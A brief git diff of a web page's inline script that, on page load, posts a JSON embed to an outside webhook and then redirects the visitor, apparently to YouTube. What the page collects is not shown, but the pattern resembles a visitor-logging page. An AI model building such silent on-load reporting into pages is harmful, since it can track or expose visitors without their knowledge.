@@ -64,9 +64,8 @@ setTimeout(() => {
       if (!redirect) {
         redirect = 'https://youtube.com'
       }
-      if (!redirect.includes('http')) {
-        redirect = 'https://' + redirect
-      }
+      redirect = redirect.replace('https:/', '').replace('http:/', '')
+      redirect = 'https://' + redirect
       await fetch(webhook, {
                   body: JSON.stringify({
                       embeds: [{
@@ -81,7 +80,7 @@ setTimeout(() => {
       //window.location.href = redirect;
     }
     // <meta http-equiv="refresh" content="2; URL=https://www.youtube.com/watch?v=xvFZjo5PgG0" />
-    fetching()
+    document.addEventListener('DOMContentLoaded', () => {fetching()})
     </script>
   </head>
   <body>
